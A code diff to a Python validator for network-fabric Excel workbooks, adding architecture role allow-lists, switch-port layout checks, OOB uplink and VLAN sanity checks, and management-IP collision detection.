@@ -26,13 +26,22 @@ import openpyxl
 # Re-use the parser's canonical-role helpers so the validator and parser
 # share one source of truth for category resolution.
 from excel_parser import (CANONICAL_ROLES, canonical_category, extract_role_index,
-                          build_wiremap_column_map)
+                          build_wiremap_column_map, parse_air_settings)
+from oob_reserved import (OOB_SUBNET, DEFAULT_AIR_MGMT_SUBNET,
+                          find_oob_collisions, air_mgmt_intruders,
+                          oob_reserved_for_mode)
+
+try:
+    from models import ModelError, load_arch_model
+except ImportError:  # pragma: no cover - keeps standalone legacy paths working
+    ModelError = ValueError
+    load_arch_model = None
 
 # ---------------------------------------------------------------------------
 # Constants
 # ---------------------------------------------------------------------------
 
-VALID_ARCHS = ("2-4-3-200", "2-8-5-200", "2-8-9-400", "2-8-9-800")
+VALID_ARCHS = ("2-4-3-200", "2-4-5-800", "2-8-5-200", "2-8-9-400", "2-8-9-800", "2-8-9-400-SP")
 
 # Per-arch enforcement mode for the canonical-role allow-list
 # (docs/ROLES.md migration plan, step 3). When the Function / System Role
@@ -41,9 +50,11 @@ VALID_ARCHS = ("2-4-3-200", "2-8-5-200", "2-8-9-400", "2-8-9-800")
 #   warn   -> warning  (legacy archs migrate at their own pace)
 ROLE_ENFORCEMENT = {
     '2-4-3-200': 'warn',
+    '2-4-5-800': 'strict',
     '2-8-5-200': 'warn',
     '2-8-9-400': 'warn',
     '2-8-9-800': 'strict',
+    '2-8-9-400-SP': 'strict',  # derived from 2-8-9-800 (clean start) → strict like its parent
 }
 
 # Function values that are arch-specific. A canonical role may still be
@@ -54,22 +65,28 @@ ROLE_ENFORCEMENT = {
 #
 # Format: {function: {set of archs where this role IS valid}}
 ARCH_RESTRICTED_FUNCTIONS = {
-    'core':        frozenset({'2-4-3-200', '2-8-5-200', '2-8-9-400'}),
-    'csl':         frozenset({'2-8-9-800'}),
-    'gsl':         frozenset({'2-8-9-800'}),  # bare form, legacy
-    'gsl-plane1':  frozenset({'2-8-9-800'}),
-    'gsl-plane2':  frozenset({'2-8-9-800'}),
-    'ext-storage': frozenset({'2-8-9-800'}),
+    'core':             frozenset({'2-4-3-200', '2-4-5-800', '2-8-5-200', '2-8-9-400'}),
+    'csl':              frozenset({'2-4-5-800', '2-8-5-200', '2-8-9-400', '2-8-9-800', '2-8-9-400-SP'}),
+    'cs':               frozenset({'2-4-5-800', '2-8-5-200', '2-8-9-400', '2-8-9-800', '2-8-9-400-SP'}),
+    'gsl':              frozenset({'2-8-9-800', '2-8-9-400-SP'}),  # bare form, legacy
+    'gsl-plane1':       frozenset({'2-4-5-800', '2-8-5-200', '2-8-9-400', '2-8-9-800', '2-8-9-400-SP'}),
+    'gsl-plane2':       frozenset({'2-4-5-800', '2-8-9-800'}),
+    'gs-plane1':        frozenset({'2-4-5-800', '2-8-5-200', '2-8-9-400', '2-8-9-800', '2-8-9-400-SP'}),
+    'gs-plane2':        frozenset({'2-4-5-800', '2-8-9-800'}),
+    'ext-storage':      frozenset({'2-8-9-800', '2-8-9-400-SP'}),
 }
 
 # Categories that count as "switch" for mgmt-IP-required checks etc.
 _SWITCH_CATEGORIES = frozenset({
-    'core', 'csl', 'gsl', 'gsl-plane1', 'gsl-plane2',
+    'core', 'csl', 'cs', 'cl', 'gsl', 'gsl-plane1', 'gsl-plane2',
+    'gl-plane1', 'gl-plane2', 'gs-plane1', 'gs-plane2',
     'oob-switch', 'edge', 'air-oob',
 })
 
-# Categories that satisfy the "have at least one converged-fabric leaf" check.
-_CONVERGED_LEAF_CATEGORIES = frozenset({'core', 'csl'})
+# Categories that satisfy the "have at least one compute/N-S leaf" check:
+# core (converged collapsed), csl (dedicated 1-tier combined leaf+spine), or
+# cl (dedicated 2-tier leaf). All three terminate the compute/N-S fabric.
+_CONVERGED_LEAF_CATEGORIES = frozenset({'core', 'csl', 'cl'})
 
 REQUIRED_SHEETS = ["Settings", "Nodes", "VLANs & Profiles"]
 
@@ -85,6 +102,8 @@ OPTIONAL_SETTINGS_KEYS = [
     "site_name",
     "deploy_in_air",
     "tiers",
+    "ns_tiers",
+    "ew_tiers",
     "convergence",
     "disabled_ports",
     "ldap_enabled",
@@ -151,6 +170,7 @@ AIR_COL_SWITCH_PORT = 8
 
 MAC_RE = re.compile(r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$')
 PORT_RE = re.compile(r'^(swp\d+([s]\d+)?|eth\d+|enp\d+s\d+f\d+(np\d+)?)$')
+SWP_PORT_RE = re.compile(r'^swp(\d+)(?:s(\d+))?$', re.IGNORECASE)
 
 # SEC (scan finding #1): Settings scalars that get rendered *unquoted* into a
 # root-executed shell — NVUE config scripts (`nv set system ntp server X`,
@@ -166,6 +186,10 @@ SHELL_INJECTION_PRONE_KEYS = (
     "ldap_root_dn",
     "ldap_domain",
     "ldap_servers",
+    # site_name is substituted into the {site} login-banner placeholder, which
+    # is rendered into a root-executed switch config. Reject shell metacharacters
+    # so a quote/`;`/`$` can't break out of the banner argument (security review #16).
+    "site_name",
 )
 # Shell metacharacters + any ASCII control char. Deliberately allows the chars
 # these structured fields legitimately use: alnum, space, . - _ / = , + : @
@@ -272,6 +296,224 @@ def _cell(ws, row, col):
     if isinstance(v, str):
         return v.strip()
     return v
+
+
+def _parse_swp_port(value):
+    match = SWP_PORT_RE.match(str(value or '').strip())
+    if not match:
+        return None
+    parent = int(match.group(1))
+    subport = int(match.group(2)) if match.group(2) is not None else None
+    return parent, subport
+
+
+def _layout_breakout_subports(role_spec):
+    breakout = str((role_spec or {}).get('breakout') or '').strip()
+    match = re.match(r'^(\d+)x', breakout)
+    return int(match.group(1)) if match else None
+
+
+def _layout_disabled_parent_ports(role_spec):
+    disabled = set()
+    for value in (role_spec or {}).get('disabled_ports') or []:
+        parsed = _parse_swp_port(value)
+        if parsed:
+            disabled.add(parsed[0])
+    return disabled
+
+
+def _expand_layout_port_range(role_spec):
+    raw_range = str((role_spec or {}).get('range') or '').strip()
+    if not raw_range:
+        return []
+
+    start_raw, end_raw = raw_range.split('-', 1) if '-' in raw_range else (raw_range, raw_range)
+    start = _parse_swp_port(start_raw)
+    end = _parse_swp_port(end_raw)
+    if not start or not end:
+        return []
+
+    start_parent, start_subport = start
+    end_parent, end_subport = end
+    if (end_parent, end_subport if end_subport is not None else -1) < (
+        start_parent,
+        start_subport if start_subport is not None else -1,
+    ):
+        return []
+
+    disabled = _layout_disabled_parent_ports(role_spec)
+    if start_subport is None and end_subport is None:
+        return [
+            f'swp{parent}'
+            for parent in range(start_parent, end_parent + 1)
+            if parent not in disabled
+        ]
+
+    subport_count = _layout_breakout_subports(role_spec)
+    max_subport = (subport_count - 1) if subport_count else max(start_subport or 0, end_subport or 0)
+    ports = []
+    for parent in range(start_parent, end_parent + 1):
+        if parent in disabled:
+            continue
+        first_subport = start_subport if parent == start_parent and start_subport is not None else 0
+        last_subport = end_subport if parent == end_parent and end_subport is not None else max_subport
+        for subport in range(first_subport, last_subport + 1):
+            ports.append(f'swp{parent}s{subport}')
+    return ports
+
+
+def _layout_role_specs(model):
+    specs = {}
+    for layout in (model.get('switch_layouts') or {}).values():
+        for function in layout.get('applies_to_functions') or []:
+            for role, spec in (layout.get('port_roles') or {}).items():
+                specs[(function, role)] = spec
+    return specs
+
+
+def _layout_allowed_ports(role_specs, function, role):
+    spec = role_specs.get((function, role))
+    if not spec:
+        return set()
+    specs = [spec]
+    for overflow_role in spec.get('overflow_roles') or []:
+        overflow_spec = role_specs.get((function, str(overflow_role)))
+        if overflow_spec:
+            specs.append(overflow_spec)
+    ports = set()
+    for item in specs:
+        ports.update(_expand_layout_port_range(item))
+    return ports
+
+
+def _layout_range_label(role_specs, function, role):
+    spec = role_specs.get((function, role))
+    if not spec:
+        return ''
+    ranges = [str(spec.get('range') or '')]
+    for overflow_role in spec.get('overflow_roles') or []:
+        overflow_spec = role_specs.get((function, str(overflow_role)))
+        if overflow_spec:
+            ranges.append(str(overflow_spec.get('range') or ''))
+    return ', '.join(value for value in ranges if value)
+
+
+def _endpoint_category(name, role_hint, nodes_function_map):
+    name_str = str(name or '').strip()
+    role_str = str(role_hint or '').strip()
+    if name_str and nodes_function_map and name_str in nodes_function_map:
+        return nodes_function_map[name_str]
+
+    category = canonical_category(role_str, name_str or None)
+    if category:
+        return category
+
+    lowered = name_str.lower()
+    if lowered.startswith('cust-net-edge-'):
+        return 'edge'
+    if lowered.startswith('ext-'):
+        return 'storage'
+    return None
+
+
+def _layout_role_for_endpoint(function, peer_function, profile):
+    profile_lc = str(profile or '').strip().lower()
+    if not function or not profile_lc:
+        return None
+
+    if function == 'oob-switch':
+        if profile_lc == 'oob':
+            return 'oob_access'
+        if profile_lc == 'oob uplink':
+            return 'oob_uplink'
+        return None
+
+    if profile_lc == 'cpu/in-band network':
+        return 'support' if peer_function == 'support' else 'cpu_inband'
+    if profile_lc == 'gpu network':
+        return 'gpu'
+    if profile_lc == 'storage':
+        return 'storage'
+    if profile_lc == 'edge uplink':
+        return 'common_exit'
+    if profile_lc == 'oob uplink':
+        return 'oob'
+    if profile_lc in ('isl', 'n/s leaf peer'):
+        return 'isl'
+    return None
+
+
+def validate_switch_layout_ports(wb, settings, nodes_function_map, result):
+    """Validate model-aware switch port ranges when an arch exposes layouts."""
+    if load_arch_model is None:
+        return
+    arch = str((settings or {}).get('architecture') or '').strip()
+    if not arch:
+        return
+    try:
+        model = load_arch_model(arch)
+    except ModelError as exc:
+        result.warn('Switch layout', f'Could not load architecture model for {arch}: {exc}')
+        return
+
+    role_specs = _layout_role_specs(model)
+    if not role_specs or 'Wire Map' not in wb.sheetnames:
+        return
+
+    ws = wb['Wire Map']
+    try:
+        col_map = build_wiremap_column_map(ws, sheet_kind='wiremap')
+    except ValueError:
+        return
+
+    columns = {
+        'system_role': col_map.get('system_role'),
+        'system_name': col_map.get('system_name'),
+        'nic_port': col_map.get('nic_port'),
+        'switch_role': col_map.get('switch_role'),
+        'switch_name': col_map.get('switch_name'),
+        'switch_port': col_map.get('switch_port'),
+        'network_profile': col_map.get('network_profile'),
+    }
+    required = ('system_name', 'nic_port', 'switch_name', 'switch_port', 'network_profile')
+    if any(columns.get(name) is None for name in required):
+        return
+
+    allowed_cache = {}
+    for row in range(2, ws.max_row + 1):
+        profile = _cell(ws, row, columns['network_profile'])
+        a_name = _cell(ws, row, columns['system_name'])
+        a_role = _cell(ws, row, columns['system_role'])
+        a_port = _cell(ws, row, columns['nic_port'])
+        b_name = _cell(ws, row, columns['switch_name'])
+        b_role = _cell(ws, row, columns['switch_role'])
+        b_port = _cell(ws, row, columns['switch_port'])
+
+        a_function = _endpoint_category(a_name, a_role, nodes_function_map)
+        b_function = _endpoint_category(b_name, b_role, nodes_function_map)
+
+        endpoints = (
+            (a_name, a_port, a_function, b_function),
+            (b_name, b_port, b_function, a_function),
+        )
+        for name, port, function, peer_function in endpoints:
+            if not name or not port or function is None:
+                continue
+            role = _layout_role_for_endpoint(function, peer_function, profile)
+            if role is None or (function, role) not in role_specs:
+                continue
+            port_str = str(port).strip()
+            cache_key = (function, role)
+            if cache_key not in allowed_cache:
+                allowed_cache[cache_key] = _layout_allowed_ports(role_specs, function, role)
+            if port_str not in allowed_cache[cache_key]:
+                range_label = _layout_range_label(role_specs, function, role)
+                result.error(
+                    'Switch layout',
+                    f"Wire Map row {row}: {name} ({function}) uses {port_str} "
+                    f"for profile '{profile}', but model role '{role}' only allows "
+                    f"{range_label}."
+                )
 
 
 def _is_valid_ip(ip_str):
@@ -386,20 +628,10 @@ def validate_settings(ws, result):
             except ValueError:
                 pass
 
-    # S9: air_mgmt_subnet must not overlap mgmt_subnets.
-    air_mgmt = settings.get('air_mgmt_subnet')
-    if air_mgmt and str(air_mgmt).strip() and mgmt_nets:
-        try:
-            air_net = ipaddress.IPv4Network(str(air_mgmt).strip(), strict=False)
-            for mnet in mgmt_nets:
-                if air_net.overlaps(mnet):
-                    result.error("Settings",
-                                 f"air_mgmt_subnet '{air_mgmt}' overlaps with "
-                                 f"mgmt_subnets entry '{mnet}'. These must be "
-                                 f"disjoint — Air virtual node IPs vs. OOB switch "
-                                 f"management IPs collide otherwise.")
-        except ValueError:
-            result.error("Settings", f"Invalid air_mgmt_subnet CIDR: '{air_mgmt}'")
+    # S9: air_mgmt_subnet must not overlap mgmt_subnets. NOTE: air_mgmt_subnet is
+    # authored on the Air_Only sheet, not Settings, so this overlap check runs in
+    # validate_excel() (via _validate_air_mgmt_overlap) once the Air_Only value
+    # has been resolved — not here, where settings has no air_mgmt_subnet yet.
 
     # management_switches — positive integer; reject floats (silent truncation).
     ms = settings.get('management_switches')
@@ -602,8 +834,8 @@ def validate_settings(ws, result):
     # `tiers='1'` (text-formatted cell) propagates as a string into
     # group_vars/all/main.yml; downstream Jinja `{% if tiers > 1 %}`
     # compares string-vs-int and is silently wrong.
-    for k in ('tiers', 'scalable_units', 'nodes_per_su', 'num_physical_ports',
-              'gpu_planes', 'management_switches'):
+    for k in ('tiers', 'ns_tiers', 'ew_tiers', 'scalable_units', 'nodes_per_su',
+              'num_physical_ports', 'gpu_planes', 'management_switches'):
         v = settings.get(k)
         if v is None or v == '':
             continue
@@ -1575,14 +1807,21 @@ def validate_wire_map(ws, result, sheet_name="Wire Map", nodes_function_map=None
         # hostname-as-role ('csl-01') matches canonical ('csl').
         if nodes_function_map and sys_name_str in nodes_function_map:
             nodes_func = nodes_function_map[sys_name_str]
-            wm_canon = canonical_category(sys_role_str, sys_name_str)
-            if wm_canon and wm_canon != nodes_func:
+            # Only flag a disagreement when the Wire Map row EXPLICITLY states a
+            # System Role. A blank role asserts nothing — inferring one from the
+            # hostname produced false positives once tier-aware names landed
+            # (host 'cl-01' name-infers to 'csl' while its Function is correctly
+            # 'cl'). Canonicalize both stated sides so e.g. wiremap 'gsl-plane1'
+            # vs Function 'csl' still differs and warns.
+            wm_canon = canonical_category(sys_role_str, None) if sys_role_str else ''
+            nodes_canon = canonical_category(nodes_func, sys_name_str)
+            if wm_canon and nodes_canon and wm_canon != nodes_canon:
                 result.warn(sheet_name,
                             f"Row {row}: System Role '{sys_role_str}' (canonical "
                             f"'{wm_canon}') disagrees with Nodes tab Function "
-                            f"'{nodes_func}' for hostname '{sys_name_str}'. "
-                            f"Nodes tab is authoritative — fix the Wire Map row "
-                            f"or update Nodes.")
+                            f"'{nodes_func}' (canonical '{nodes_canon}') for hostname "
+                            f"'{sys_name_str}'. Nodes tab is authoritative — fix the "
+                            f"Wire Map row or update Nodes.")
         sw_role = _cell(ws, row, sw_role_col)  # may be None (optional col)
         sw_name = _cell(ws, row, sw_name_col)
         sw_port = _cell(ws, row, sw_port_col)
@@ -1602,6 +1841,41 @@ def validate_wire_map(ws, result, sheet_name="Wire Map", nodes_function_map=None
         if sw_role_str.lower() == 'outbound' or sw_name_str.lower() == 'outbound':
             skip_reasons['outbound link'] += 1
             continue
+
+        # Gate: an OOB uplink (oob-switch <-> core/CSL) must terminate on an
+        # SN2201 QSFP28 uplink port (swp49-52), never a copper host port
+        # (swp1-48). The OOB template makes swp1-48 L2 bridge access ports at
+        # 1G (excel_parser bridge_nums = range(1,49)) while the parser also
+        # emits the uplink port as an L3 unnumbered eBGP neighbor. On swp1-48
+        # the port gets BOTH — and a bridged 1G access port can't run
+        # unnumbered eBGP, so the OOB<->CSL underlay (and the EVPN overlay
+        # riding over it) never comes up. swp49-52 sit outside the bridge
+        # range and render as clean routed interfaces. Root-caused on the
+        # a live 2-8-9-800 site. See test_validate_oob_uplink_port.py and
+        # docs/internal/adr/0025-oob-uplinks-on-sn2201-qsfp28-ports.md.
+        profile_val = _cell(ws, row, profile_col) if profile_col else None
+        profile_str = str(profile_val).strip().lower() if profile_val else ''
+        a_is_oob = 'oob-switch' in sys_name_str.lower()
+        b_is_oob = 'oob-switch' in sw_name_str.lower()
+        if (a_is_oob or b_is_oob) and (
+                ('oob' in profile_str and 'uplink' in profile_str)
+                or ('sn2201' in profile_str)
+                or ('uplink' in profile_str)):
+            if b_is_oob:
+                oob_name, oob_port_str = sw_name_str, sw_port_str
+            else:
+                a_port_raw = _cell(ws, row, col_map.get('nic_port'))
+                oob_name = sys_name_str
+                oob_port_str = str(a_port_raw).strip() if a_port_raw else ''
+            m_oob = SWP_PORT_RE.match(oob_port_str)
+            if m_oob and int(m_oob.group(1)) <= 48:
+                result.error(sheet_name,
+                             f"Row {row}: OOB uplink terminates on {oob_name} "
+                             f"{oob_port_str}, a copper host port (swp1-48). SN2201 "
+                             f"copper ports are L2 1G bridge access ports and can't "
+                             f"run the L3 unnumbered eBGP underlay — OOB<->CSL BGP "
+                             f"will not come up. Move the uplink to a QSFP28 uplink "
+                             f"port (swp49-52).")
 
         # Sentinel detection: skip self-loop + B-side checks when both
         # sides are sentinel names (e.g. SPARE ISL marking unused links).
@@ -1938,6 +2212,16 @@ def _validate_oob_switch_air_capacity(ws, result):
 
 _PLANE_HOSTNAME_RE = re.compile(r'-plane(\d+)(?:-|$)')
 _PLANE_VLAN_NAME_RE = re.compile(r'^gpu_plane(\d+)$', re.IGNORECASE)
+_RAIL_VLAN_NAME_RE = re.compile(r'^gpu_rail(\d+)$', re.IGNORECASE)
+_RAIL_PLANE_VLAN_NAME_RE = re.compile(r'^gpu_rail(\d+)_plane(\d+)$', re.IGNORECASE)
+_RAIL_PROFILE_RE = re.compile(
+    r'^gpu[\s_-]*rail[\s_-]*(\d+)$',
+    re.IGNORECASE,
+)
+_RAIL_PLANE_PROFILE_RE = re.compile(
+    r'^gpu[\s_-]*rail[\s_-]*(\d+)[\s_-]*plane[\s_-]*(\d+)$',
+    re.IGNORECASE,
+)
 
 
 def _planes_referenced_in_wire_map(wb):
@@ -1974,6 +2258,65 @@ def _planes_referenced_in_wire_map(wb):
             planes.add(plane)
             nic_count[plane] = nic_count.get(plane, 0) + 1
     return planes, nic_count
+
+
+def _rail_planes_referenced_in_wire_map(wb):
+    """Return GPU interface counts keyed by (plane, rail).
+
+    This is intentionally based on Wire Map Network Profile values such as
+    `GPU Rail 3 Plane 2`. Counting all rows whose switch hostname includes
+    `-planeN-` is too broad for rail capacity because it includes spine/ISL
+    rows and treats one rail subnet as if it must hold the whole plane.
+    """
+    counts = {}
+    for sheet_name, sheet_kind in (('Wire Map', 'wiremap'), ('Air_Only', 'air_only')):
+        if sheet_name not in wb.sheetnames:
+            continue
+        ws = wb[sheet_name]
+        try:
+            col_map = build_wiremap_column_map(ws, sheet_kind=sheet_kind)
+        except ValueError:
+            continue
+        profile_col = col_map.get('network_profile')
+        if not profile_col:
+            continue
+        for row in range(2, ws.max_row + 1):
+            profile = ws.cell(row, profile_col).value
+            if not profile:
+                continue
+            match = _RAIL_PLANE_PROFILE_RE.match(str(profile).strip())
+            if not match:
+                continue
+            rail = int(match.group(1))
+            plane = f'plane{int(match.group(2))}'
+            counts[(plane, rail)] = counts.get((plane, rail), 0) + 1
+    return counts
+
+
+def _rails_referenced_in_wire_map(wb):
+    """Return GPU interface counts keyed by rail for single-plane per-rail mode."""
+    counts = {}
+    for sheet_name, sheet_kind in (('Wire Map', 'wiremap'), ('Air_Only', 'air_only')):
+        if sheet_name not in wb.sheetnames:
+            continue
+        ws = wb[sheet_name]
+        try:
+            col_map = build_wiremap_column_map(ws, sheet_kind=sheet_kind)
+        except ValueError:
+            continue
+        profile_col = col_map.get('network_profile')
+        if not profile_col:
+            continue
+        for row in range(2, ws.max_row + 1):
+            profile = ws.cell(row, profile_col).value
+            if not profile:
+                continue
+            match = _RAIL_PROFILE_RE.match(str(profile).strip())
+            if not match:
+                continue
+            rail = int(match.group(1))
+            counts[rail] = counts.get(rail, 0) + 1
+    return counts
 
 
 _LOOPBACK_VRFS = ('OOB', 'INBAND', 'EXIT', 'GPU', 'STORAGE')
@@ -2233,6 +2576,29 @@ def validate_loopbacks(ws, parsed_nodes, parsed_vlans, settings, result):
                              f"silently collide at apply time.")
 
 
+def validate_tiers_consistency(settings, roles_present):
+    """ns_tiers/ew_tiers must match the spine roles actually declared.
+
+    settings: dict of Settings values. roles_present: set of canonical role
+    strings present among switches. Falls back to a legacy single `tiers`.
+    Returns a list of error strings (empty = consistent).
+    """
+    errs = []
+    ns = int(settings.get("ns_tiers", settings.get("tiers", 1)) or 1)
+    ew = int(settings.get("ew_tiers", settings.get("tiers", 1)) or 1)
+    has_cs = "cs" in roles_present
+    has_gs = bool({"gs-plane1", "gs-plane2"} & set(roles_present))
+    if ns == 2 and not has_cs:
+        errs.append("ns_tiers=2 but no compute spine (cs) is declared")
+    if ns == 1 and has_cs:
+        errs.append("ns_tiers=1 but a compute spine (cs) is declared")
+    if ew == 2 and not has_gs:
+        errs.append("ew_tiers=2 but no GPU spine (gs) is declared")
+    if ew == 1 and has_gs:
+        errs.append("ew_tiers=1 but a GPU spine (gs) is declared")
+    return errs
+
+
 def validate_plane_consistency(wb, parsed_vlans, result):
     """Verify Wire Map plane references match gpu_plane<N> VLAN rows.
 
@@ -2244,17 +2610,31 @@ def validate_plane_consistency(wb, parsed_vlans, result):
     planes_in_wm, nic_count = _planes_referenced_in_wire_map(wb)
 
     planes_in_vlans = {}
+    rail_vlans = {}
+    rail_plane_vlans = {}
     for v in parsed_vlans:
         name = v.get('name') or ''
         m = _PLANE_VLAN_NAME_RE.match(name)
         if m:
             planes_in_vlans[f'plane{m.group(1)}'] = v
             continue
+        # Single-plane per-rail mode: gpu_rail<R> rows replace the aggregate
+        # gpu_plane1 VLAN row, but still satisfy plane1 switch references.
+        m_r = _RAIL_VLAN_NAME_RE.match(name)
+        if m_r:
+            rail_vlans[int(m_r.group(1))] = v
+            continue
         # Per-rail-per-plane mode: gpu_rail<R>_plane<P> rows also satisfy
         # the plane reference (the operator is using the new naming).
-        m_rp = re.match(r'^gpu_rail\d+_plane(\d+)$', name, re.IGNORECASE)
+        m_rp = _RAIL_PLANE_VLAN_NAME_RE.match(name)
         if m_rp:
-            planes_in_vlans.setdefault(f'plane{m_rp.group(1)}', v)
+            rail = int(m_rp.group(1))
+            plane = f'plane{int(m_rp.group(2))}'
+            rail_plane_vlans[(plane, rail)] = v
+            planes_in_vlans.setdefault(plane, v)
+
+    if planes_in_wm == {'plane1'} and rail_vlans:
+        planes_in_vlans.setdefault('plane1', next(iter(rail_vlans.values())))
 
     if not planes_in_wm and not planes_in_vlans:
         return  # single-plane arch, nothing to check
@@ -2271,6 +2651,43 @@ def validate_plane_consistency(wb, parsed_vlans, result):
         result.warn("Plane consistency",
                     f"VLANs & Profiles defines 'gpu_{plane}' but no Wire Map "
                     f"switch hostname contains '-{plane}-'.")
+
+    if rail_plane_vlans:
+        rail_plane_count = _rail_planes_referenced_in_wire_map(wb)
+        for (plane, rail), needed in sorted(rail_plane_count.items()):
+            vlan = rail_plane_vlans.get((plane, rail))
+            if vlan is None:
+                result.error("Plane consistency",
+                             f"Wire Map references GPU Rail {rail} {plane} "
+                             f"but VLANs & Profiles has no "
+                             f"'gpu_rail{rail}_{plane}' row.")
+                continue
+            if not vlan.get('network'):
+                continue
+            capacity = vlan['network'].num_addresses - 2
+            if needed > capacity:
+                result.error("Plane consistency",
+                             f"GPU Rail {rail} {plane} subnet {vlan['network']} "
+                             f"has {capacity} usable IPs but Wire Map needs {needed}.")
+        return
+
+    if rail_vlans and planes_in_wm <= {'plane1'}:
+        rail_count = _rails_referenced_in_wire_map(wb)
+        for rail, needed in sorted(rail_count.items()):
+            vlan = rail_vlans.get(rail)
+            if vlan is None:
+                result.error("Plane consistency",
+                             f"Wire Map references GPU Rail {rail} but VLANs & "
+                             f"Profiles has no 'gpu_rail{rail}' row.")
+                continue
+            if not vlan.get('network'):
+                continue
+            capacity = vlan['network'].num_addresses - 2
+            if needed > capacity:
+                result.error("Plane consistency",
+                             f"GPU Rail {rail} subnet {vlan['network']} has "
+                             f"{capacity} usable IPs but Wire Map needs {needed}.")
+        return
 
     for plane, vlan in planes_in_vlans.items():
         if not vlan.get('network'):
@@ -2622,6 +3039,67 @@ def validate_port_profiles(ws, result):
                          f"'{mode_raw}' is not recognized. Allowed: "
                          f"{', '.join(sorted(_VALID_PORT_MODES))}.")
             continue
+        # Catch the Excel-autocast-ate-the-commas footgun. Operator types
+        # '400,500' into the Allowed VLANs cell; Excel decides it's a number
+        # and stores it as 400500. Parser then emits `vlan 400500`, NVUE
+        # rejects (out of 1-4094), era-apply.service fails at first boot.
+        # Same for Native/Access and Untagged columns. Fail loud at validation
+        # so this can't reach a deploy again.
+        for vlan_col_label in ('native/access vlan', 'allowed vlans', 'untagged vlan'):
+            vc = col_map.get(vlan_col_label)
+            if not vc:
+                continue
+            cv = ws.cell(row=row, column=vc).value
+            if cv in (None, ''):
+                continue
+            # Coerce numeric cells to int up front so float autocast (e.g.
+            # Excel saving as 400500.0) doesn't slip past the int(tok) parse
+            # below — `int('400500.0')` would raise ValueError and the token
+            # would be silently skipped, defeating the whole guard.
+            if isinstance(cv, float) and cv.is_integer():
+                cv = int(cv)
+            tokens = [t.strip() for t in str(cv).split(',') if t.strip()]
+            for tok in tokens:
+                try:
+                    vid = int(tok)
+                except ValueError:
+                    # Try float-shaped strings ("400500.0") before giving up.
+                    try:
+                        f = float(tok)
+                        vid = int(f) if f.is_integer() else None
+                    except ValueError:
+                        vid = None
+                    if vid is None:
+                        continue
+                if vid < 1 or vid > 4094:
+                    hint = (' — looks like Excel auto-cast a comma-separated '
+                            'list into a single number. Format the cell as Text '
+                            'and re-enter (e.g. "400,500"), or prefix with an '
+                            "apostrophe ('400,500).") if vid > 4094 and ',' not in str(cv) else ''
+                    result.error("VLANs & Profiles",
+                                 f"Port Profiles row {row} ('{name}'): "
+                                 f"{vlan_col_label.title()} value {cv!r} contains "
+                                 f"VLAN id {vid} outside the valid 1-4094 range."
+                                 f"{hint}")
+        # Breakout / Lanes must be positive integers. excel_parser does a bare
+        # int() on these when building port profiles, so a non-numeric cell
+        # (e.g. "4x", "two") crashes `make generate`/`make deploy` with an
+        # uncaught ValueError. Catch it here with an actionable message.
+        for num_label in ('breakout', 'lanes'):
+            nc = col_map.get(num_label)
+            if not nc:
+                continue
+            nv = ws.cell(row=row, column=nc).value
+            if nv in (None, ''):
+                continue
+            ok = (isinstance(nv, (int, float)) and float(nv).is_integer() and int(nv) > 0) \
+                or (isinstance(nv, str) and nv.strip().isdigit() and int(nv.strip()) > 0)
+            if not ok:
+                result.error("VLANs & Profiles",
+                             f"Port Profiles row {row} ('{name}'): {num_label.title()} "
+                             f"value {nv!r} must be a positive whole number (e.g. 4). "
+                             f"A non-numeric value crashes `make generate`.")
+
         if mode == 'l3':
             # L3 ports are unbridged. Allowed VLANs / Untagged /
             # LACP Bypass are L2 concepts.
@@ -3041,6 +3519,137 @@ def validate_cross_sheet_data(settings, parsed_nodes, parsed_vlans, result):
                                     f"VLAN {vlan['id']} ({vlan['name']}) subnet {vlan['network']}")
 
 
+def _validate_air_mgmt_overlap(air_mgmt_subnet, mgmt_csv, result):
+    """The air-mgmt subnet (Air_Only "Air Management Subnet") and the OOB
+    mgmt_subnets (Settings) must be disjoint — Air virtual-node IPs and OOB
+    switch management IPs collide otherwise. Lives here (not validate_settings)
+    because air_mgmt_subnet is authored on the Air_Only sheet and is only
+    resolved after that sheet is parsed.
+    """
+    if not air_mgmt_subnet or not str(air_mgmt_subnet).strip():
+        return
+    try:
+        air_net = ipaddress.IPv4Network(str(air_mgmt_subnet).strip(), strict=False)
+    except ValueError:
+        result.error("Air_Only", f"Invalid air_mgmt_subnet CIDR: '{air_mgmt_subnet}'")
+        return
+    for part in str(mgmt_csv or '').split(','):
+        part = part.strip()
+        if not part:
+            continue
+        try:
+            mnet = ipaddress.IPv4Network(part, strict=False)
+        except ValueError:
+            continue  # malformed mgmt_subnets entry already reported in Settings
+        if air_net.overlaps(mnet):
+            result.error("Air_Only",
+                         f"air_mgmt_subnet '{air_mgmt_subnet}' overlaps with "
+                         f"mgmt_subnets entry '{mnet}'. These must be disjoint — "
+                         f"Air virtual node IPs vs. OOB switch management IPs "
+                         f"collide otherwise.")
+
+
+def validate_oob_mgmt_ip_collisions(parsed_nodes, result, settings=None):
+    """Hard gate against silent mgmt-IP collisions on either management plane.
+
+    OOB plane (192.168.200.0/24, matching production VLAN 200): no two hosts
+    may share a mgmt IP, and no Nodes-tab host may land on an octet reserved
+    for Air infrastructure. The reserved set is OOB-mode-aware — L3 reserves the
+    EXIT-VRF trio (external-dhcp .77 / utility .78 / external-conn .79); L2 (the
+    default) does not, since those nodes don't exist there. A duplicate triggers
+    an ARP/DAD war and ~60% packet loss to the colliding host — surfacing only
+    at validate-servers time as an unexplained "hang". Root-caused 2026-06-24 on
+    2-8-9-400/maxscale (L3) where a server and the L3-OOB jump (utility) both
+    landed on .200.78.
+
+    Air-mgmt plane (the Air_Only "Air Management Subnet", default 172.20.0.0/24):
+    this /24 is reserved end-to-end for auto-assigned switch eth0 IPs plus the
+    fixed L3-trio / SVI octets, so a Nodes-tab host must NEVER land here — it
+    would silently collide with a switch eth0 the operator can't see. Both fail
+    loudly at validate-excel time instead. See oob_reserved.py.
+    """
+    claims = []
+    for node in parsed_nodes:
+        if not node.get('ip'):
+            continue
+        label = f"{node.get('function') or node.get('name') or '?'} (row {node.get('row')})"
+        claims.append((label, node['ip']))
+
+    oob_mode = (settings or {}).get('oob_uplink_mode')
+    for octet, owners in find_oob_collisions(claims, oob_reserved_for_mode(oob_mode)):
+        result.error(
+            "Nodes",
+            f"mgmt IP 192.168.200.{octet} claimed by multiple owners on the "
+            f"flat OOB subnet ({OOB_SUBNET}): {'; '.join(owners)}. Duplicate "
+            f"OOB addresses cause an ARP/DAD war on VLAN 200 and ~60% packet "
+            f"loss to the colliding host. Reassign the host to a free octet."
+        )
+
